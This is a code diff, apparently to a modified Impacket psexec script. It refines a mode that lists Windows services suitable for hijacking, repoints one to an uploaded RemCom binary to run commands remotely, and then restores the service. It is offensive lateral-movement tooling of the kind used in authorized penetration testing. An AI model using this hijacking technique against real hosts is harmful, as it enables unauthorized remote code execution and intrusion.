@@ -66,7 +66,7 @@ lock = Lock()
 class PSEXEC:
     def __init__(self, command, path, exeFile, copyFile, port=445,
                  username='', password='', domain='', hashes=None, aesKey=None, doKerberos=False, kdcHost=None, serviceName=None,
-                 remoteBinaryName=None, service_list=False, service_change=None):
+                 remoteBinaryName=None, service_list=False, list_all=False, service_change=None):
         self.__username = username
         self.__password = password
         self.__port = port
@@ -83,6 +83,7 @@ class PSEXEC:
         self.__serviceName = serviceName
         self.__remoteBinaryName = remoteBinaryName
         self.__service_list = service_list
+        self.__list_all = list_all
         self.__service_change = service_change
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split(':')
@@ -91,12 +92,13 @@ class PSEXEC:
     def run(self, remoteName, remoteHost):
         # Handle service list functionality
         if self.__service_list:
-            return self.listServices(remoteName, remoteHost)
-        
+            self.listServices(remoteName, remoteHost, self.__list_all)
+
         # Handle service hijacking functionality
         if self.__service_change is not None:
             return self.executeViaServiceHijacking(remoteName, remoteHost)
         
+
         # Original psexec functionality
         stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
         logging.debug('StringBinding %s'%stringbinding)
@@ -130,7 +132,7 @@ class PSEXEC:
 
         return fid
 
-    def listServices(self, remoteName, remoteHost):
+    def listServices(self, remoteName, remoteHost, list_all):
         """List all services and mark suitable ones for hijacking"""
         # Service listing functionality for hijacking analysis
         LOG.info("Listing services on %s" % remoteHost)
@@ -157,7 +159,7 @@ class PSEXEC:
             service_changer = servicechange.ServiceChanger(smb_connection, remoteHost)
             
             # Get all services
-            services = service_changer.listAllServices()
+            services = service_changer.listServices(list_all)
             
             # Filter only suitable services
             suitable_services = [s for s in services if s.is_suitable]
@@ -180,19 +182,24 @@ class PSEXEC:
             suitable_services.sort(key=lambda x: x.priority)
             
             # Print only suitable services
+            fstart_type_map = {
+                0: "BOOT",        # SERVICE_BOOT_START
+                1: "SYSTEM",      # SERVICE_SYSTEM_START
+                2: "AUTO",        # SERVICE_AUTO_START
+                3: "MANUAL",      # SERVICE_DEMAND_START
+                4: "DISABLED"     # SERVICE_DISABLED
+            }
+
+            # Affichage des services adaptés
             for service in suitable_services:
-                start_type_map = {
-                    1: "BOOT",
-                    2: "SYSTEM", 
-                    3: "MANUAL",
-                    4: "DISABLED"
-                }
-                start_type_str = start_type_map.get(service.start_type, "UNKNOWN")
-                
-                print("%-30s %-15s %-15s %-15s %-20s" % 
-                      (service.service_name[:30], start_type_str, "STOPPED", 
-                       service.start_name[:15] if service.start_name else "N/A",
-                       str(service.priority)))
+                start_type_str = fstart_type_map.get(service.start_type, "UNKNOWN")
+                account = service.start_name[:20] if getattr(service, "start_name", None) else "N/A"
+
+                print(f"{service.service_name[:30]:<30} "
+                      f"{start_type_str:<15} "
+                      f"{'STOPPED':<15} "
+                      f"{account:<20} "
+                      f"{str(service.priority):<10}")
             
             print("="*120)
             print("Total suitable services: %d" % len(suitable_services))
@@ -257,32 +264,35 @@ class PSEXEC:
                     return False
                 service_name = service_info.service_name
             
-            LOG.info("Selected service for hijacking: %s" % service_name)
+            LOG.debug("Selected service for hijacking: %s" % service_name)
             
             # Step 1: Prepare service hijacking (restore original config first, then backup)
-            LOG.info("Preparing service hijacking...")
+            LOG.debug("Preparing service hijacking...")
             # Restore service to original state if previously hijacked
             
+            '''
+            Not valid check, not use static uploaded filename
             # First, try to restore service to original state if it was previously hijacked
-            LOG.info("Checking if service needs restoration to original state...")
+            LOG.debug("Checking if service needs restoration to original state...")
             try:
                 # Get current service info to check if it's been hijacked
                 scm_handle = service_changer.openSvcManager()
                 current_info = service_changer.getServiceInfo(service_name, scm_handle)
                 scmr.hRCloseServiceHandle(service_changer.rpcsvc, scm_handle)
-                if current_info.binary_path_name and ('RemCom' in current_info.binary_path_name or not current_info.binary_path_name.endswith('.exe') or 'alg.exe' not in current_info.binary_path_name.lower()):
+                if current_info.binary_path_name and ('RemCom' in current_info.binary_path_name):
                     LOG.info("Service appears to be hijacked, attempting to restore original configuration...")
                     # Try to restore using a default configuration
                     from impacket.examples.servicechange import ServiceInfo
                     default_config = ServiceInfo()
-                    default_config.binary_path_name = "C:\\Windows\\System32\\alg.exe" if service_name == "ALG" else "C:\\Windows\\system32\\ntfrs.exe" if service_name == "NtFrs" else "C:\\Windows\\system32\\vssvc.exe" if service_name == "VSS" else "C:\\Windows\\system32\\SearchIndexer.exe" if service_name == "WSearch" else "C:\\Windows\\System32\\snmptrap.exe" if service_name == "SNMPTRAP" else "C:\\Windows\\system32\\locator.exe" if service_name == "RpcLocator" else ""
+                    default_config.binary_path_name = "C:\\Windows\\System32\\OpenSSH\\ssh-agent.exe" if service_name == "ssh-agent" else "C:\\Windows\\System32\\alg.exe" if service_name == "ALG" else "C:\\Windows\\system32\\ntfrs.exe" if service_name == "NtFrs" else "C:\\Windows\\system32\\vssvc.exe" if service_name == "VSS" else "C:\\Windows\\system32\\SearchIndexer.exe" if service_name == "WSearch" else "C:\\Windows\\System32\\snmptrap.exe" if service_name == "SNMPTRAP" else "C:\\Windows\\system32\\locator.exe" if service_name == "RpcLocator" else ""
                     default_config.start_type = 3  # MANUAL
                     default_config.start_name = "NT AUTHORITY\\LocalService" if service_name in ["ALG", "SNMPTRAP"] else "LocalSystem"
                     service_changer.restoreServiceConfig(service_name, default_config)
-                    LOG.info("Service restored to default configuration")
+                    LOG.debug("Service restored to default configuration")
             except Exception as e:
                 LOG.debug("Could not restore service to original state: %s" % str(e))
-            
+            '''
+
             # Now backup the (hopefully) original configuration
             original_config = service_changer.backupServiceConfig(service_name)
             
@@ -328,11 +338,10 @@ class PSEXEC:
                 LOG.critical("Failed to hijack service")
                 return False
             
-            LOG.info("Service hijacked successfully, now executing command...")
-            
+            LOG.info("Service hijacked successfully, now starting service to executing command...")
             # Step 2: Execute command through hijacked service
             # The service is already hijacked with RemComSvc, now we need to communicate with it
-            LOG.info("Executing command through hijacked service...")
+            LOG.debug("Executing command through hijacked service...")
             # Execute command through the hijacked service
             
             # Create SMB connection for communication
@@ -347,18 +356,10 @@ class PSEXEC:
             
             # Execute command through the hijacked service using doStuff logic
             # but skip the service installation part since we already hijacked a service
-            self.executeCommandViaHijackedService(rpctransport, service_changer, service_name)
+            self.executeCommandViaHijackedService(rpctransport, service_changer, service_name, original_config, full_remcom_path)
             
             # Step 3: Restore original service configuration
-            LOG.info("Restoring original service configuration...")
-            # Restore service to original state after command execution
-            LOG.info("Original config - Binary Path: %s" % original_config.binary_path_name)
-            LOG.info("Original config - Start Type: %d" % original_config.start_type)
-            LOG.info("Original config - Start Name: %s" % original_config.start_name)
-            if not service_changer.restoreServiceConfig(service_name, original_config):
-                LOG.warning("Failed to restore service configuration")
-            else:
-                LOG.info("Service configuration restored successfully")
+            service_changer.restoreServiceConfig(service_name, original_config)
             
             # Cleanup uploaded files
             service_changer.cleanupFiles()
@@ -373,11 +374,22 @@ class PSEXEC:
             
             return True
             
-        except Exception as e:
-            LOG.critical("Error executing via service hijacking: %s" % str(e))
-            return False
+        except  (Exception, KeyboardInterrupt) as e:
+            if logging.getLogger().level == logging.DEBUG:
+                import traceback
+                traceback.print_exc()
+            logging.error(str(e))
+            if smb_connection is not None:
+                smb_connection.logoff()
+            sys.stdout.flush()
+            sys.exit(0)
 
-    def executeCommandViaHijackedService(self, rpctransport, service_changer, service_name):
+        if smb_connection is not None:
+            smb_connection.logoff()
+        sys.stdout.flush()
+        sys.exit(0)
+
+    def executeCommandViaHijackedService(self, rpctransport, service_changer, service_name, original_config, uploadedFile):
         """Execute command through already hijacked service"""
         # Command execution through hijacked service
         dce = rpctransport.get_dce_rpc()
@@ -434,25 +446,12 @@ class PSEXEC:
             ans = s.readNamedPipe(tid, fid_main, 8)
             if len(ans):
                 retCode = RemComResponse(ans)
-                logging.info("Process %s finished with ErrorCode: %d, ReturnCode: %d" % (
-                self.__command, retCode['ErrorCode'], retCode['ReturnCode']))
-                
-                # Stop the hijacked service after command execution
-                logging.info("Stopping hijacked service after command execution...")
-                if not service_changer.stopService(service_name):
-                    logging.warning("Failed to stop hijacked service")
-                
-                sys.exit(retCode['ErrorCode'])
+                logging.info("Process %s finished with ErrorCode: %d, ReturnCode: %d" % (self.__command, retCode['ErrorCode'], retCode['ReturnCode']))
 
-        except SystemExit:
-            raise
-        except Exception as e:
-            if logging.getLogger().level == logging.DEBUG:
-                import traceback
-                traceback.print_exc()
-            logging.debug(str(e))
-            sys.stdout.flush()
-            sys.exit(1)
+                #sys.exit(retCode['ErrorCode'])
+
+        except  (Exception, KeyboardInterrupt, SystemExit) as e:
+            return
 
     def doStuff(self, rpctransport):
 
@@ -721,13 +720,12 @@ class RemoteStdErrPipe(Pipes):
                 else:
                     try:
                         if len(stderr_ans) != 0:
-
-                        if b'\n' in __stderrOutputBuffer:
-                            # We have read a line, print buffer if it is not empty
-                            lines = __stderrOutputBuffer.split(b"\n")
-                            # All lines, we shouldn't have encoding errors
-                            __stderrData = b"\n".join(lines[:-1]) + b"\n"
-                            __stderrOutputBuffer = lines[-1]
+                            if b'\n' in __stderrOutputBuffer:
+                                # We have read a line, print buffer if it is not empty
+                                lines = __stderrOutputBuffer.split(b"\n")
+                                # All lines, we shouldn't have encoding errors
+                                __stderrData = b"\n".join(lines[:-1]) + b"\n"
+                                __stderrOutputBuffer = lines[-1]
 
                         if len(__stderrData) != 0:
                             # There is data to print
@@ -956,7 +954,8 @@ if __name__ == '__main__':
     group = parser.add_argument_group('service hijacking')
     # Service hijacking functionality arguments
     
-    group.add_argument('-service-list', action='store_true', help='List all services on target and mark suitable ones for hijacking')
+    group.add_argument('-service-list', action='store_true', help='List most common services on target and mark suitable ones for hijacking')
+    group.add_argument('--list-all', default=False, action='store_true', help='Flag to list all services instead of most common ones')
     group.add_argument('-service-change', action='store', metavar="service_name", help='Execute command by hijacking specified service')
 
     if len(sys.argv)==1:
@@ -1009,5 +1008,5 @@ if __name__ == '__main__':
 
     executer = PSEXEC(command, options.path, options.file, options.c, int(options.port), username, password, domain, options.hashes,
                       options.aesKey, options.k, options.dc_ip, options.service_name, options.remote_binary_name, 
-                      options.service_list, options.service_change)
+                      options.service_list, options.list_all, options.service_change)
     executer.run(remoteName, options.target_ip)
